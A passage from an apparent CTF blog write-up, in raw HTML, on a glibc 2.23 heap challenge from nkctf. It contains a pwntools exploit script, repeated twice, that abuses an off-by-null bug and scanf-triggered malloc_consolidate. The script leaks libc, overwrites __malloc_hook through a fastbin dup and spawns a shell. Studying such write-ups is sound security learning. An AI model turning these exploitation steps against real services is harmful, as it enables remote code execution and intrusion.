class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\">dele(<span class=\"number\">11</span>)</span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#10</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;2&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#11</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;3&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#12</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;4&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#13</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;5&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#14</span></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x200</span>)+p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;end&#x27;</span>)<span class=\"comment\">#16</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">view(<span class=\"number\">4</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">lbase = u64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3c4b20</span>-<span class=\"number\">88</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;lbase:&#x27;</span>,<span class=\"built_in\">hex</span>(lbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;B&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;C&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;D&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\"></span><br><span class=\"line\">pay = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x41</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,pay)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;asd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;zxc&#x27;</span>)<span class=\"comment\">#5,c</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;qqq&#x27;</span>)<span class=\"comment\">#6,d</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a1&#x27;</span>)<span class=\"comment\">#14</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a2&#x27;</span>)<span class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fastbin dup</span></span><br><span class=\"line\">dele(<span class=\"number\">5</span>)</span><br><span class=\"line\">dele(<span class=\"number\">14</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0xc</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">6</span>)</span><br><span class=\"line\">dele(<span class=\"number\">15</span>)</span><br><span class=\"line\">dele(<span class=\"number\">0xd</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,p64(lbase+<span class=\"number\">0x3c4b20</span>+<span class=\"number\">8</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,p64(lbase+<span class=\"number\">0x3c4b20</span>+<span class=\"number\">8</span>+<span class=\"number\">0x20</span>)+<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x10</span>+p64(<span class=\"number\">0x41</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">0x20</span>+p64(lbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]-<span class=\"number\">0x18</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x18</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,p64(lbase+<span class=\"number\">0xf03a4</span>)*<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;size:&#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"built_in\">str</span>(<span class=\"number\">0x18</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>nkctf，利用off by null和**<code>scanf</code>在输入字符串较长时会调用<code>malloc</code>**的特性，最后get shell的过程类似<code>House of Orange</code>。</p>","more":"<p>libc版本：2.23-0ubuntu11.3</p>\n<p>会读一个随机数给堆指针加密，<code>read content</code>的时候有<code>off by null</code>，<code>chunk</code>最大0x40，最多0x20个chunk</p>\n<p>和hctf2018的heapstrom_zero好像，学习一波。</p>\n<p>使用<code>scanf</code>时，如 输入字符串比较长会调用<code>malloc</code>来分配内存，借此可以触发<code>malloc_consolidata</code>来合并<code>fast bin chunk</code>，这样<code>off by null</code>就有用了，把<code>size</code>改小来实现<code>overlapping</code></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;gnome-terminal&#x27;</span>,<span class=\"string\">&#x27;-x&#x27;</span>,<span class=\"string\">&#x27;bash&#x27;</span>,<span class=\"string\">&#x27;-c&#x27;</span>]</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;/home/a1ph0nse/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\"># p = remote(&#x27;node2.yuzhian.com.cn&#x27;,32916)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;size:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;content:&#x27;</span>)</span><br><span class=\"line\">    sl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">view</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;index:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;index:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">triger_consolidate</span>():</span><br><span class=\"line\">    ru(<span class=\"string\">&#x27;Choice:&#x27;</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">0x400</span>) <span class=\"comment\"># malloc_consolidate</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x200</span>)+p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#10</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;end&#x27;</span>)<span class=\"comment\">#11</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">11</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;x&#x27;</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\">dele(<span class=\"number\">11</span>)</span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;a&#x27;</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;1&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#10</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;2&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#11</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;3&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#12</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;4&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#13</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;5&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#14</span></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+p64(<span class=\"number\">0x200</span>)+p64(<span class=\"number\">0x20</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#15</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;end&#x27;</span>)<span class=\"comment\">#16</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">9</span>,<span class=\"number\">16</span>):</span><br><span class=\"line\">    dele(i)</span><br><span class=\"line\"></span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">0</span>)</span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x38</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,pay)<span class=\"comment\">#0</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;c&#x27;</span>*<span class=\"number\">8</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\"></span><br><span class=\"line\">view(<span class=\"number\">4</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">lbase = u64(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x3c4b20</span>-<span class=\"number\">88</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;lbase:&#x27;</span>,<span class=\"built_in\">hex</span>(lbase))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">2</span>)</span><br><span class=\"line\">dele(<span class=\"number\">3</span>)</span><br><span class=\"line\">triger_consolidate()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;A&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;B&#x27;</span>*<span class=\"number\">0x20</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;C&#x27;</span>*<span class=\"number\">0x30</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,<span class=\"string\">&#x27;D&#x27;</span>*<span class=\"number\">0x10</span>)<span class=\"comment\">#9</span></span><br><span class=\"line\"></span><br><span class=\"line\">pay = p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x41</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>,pay)<span class=\"comment\">#6</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;asd&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;zxc&#x27;</span>)<span class=\"comment\">#5,c</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;qqq&#x27;</span>)<span class=\"comment\">#6,d</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>,<span class=\"string\">&#x27;a1&#x27;</span>)<span class=\"comment\">#14</span></span><br><span class=\"line\">add(<span class=\"number\">0x28</span>,<span class=\"string\">&#x27;a2&#x27;</span>)<span 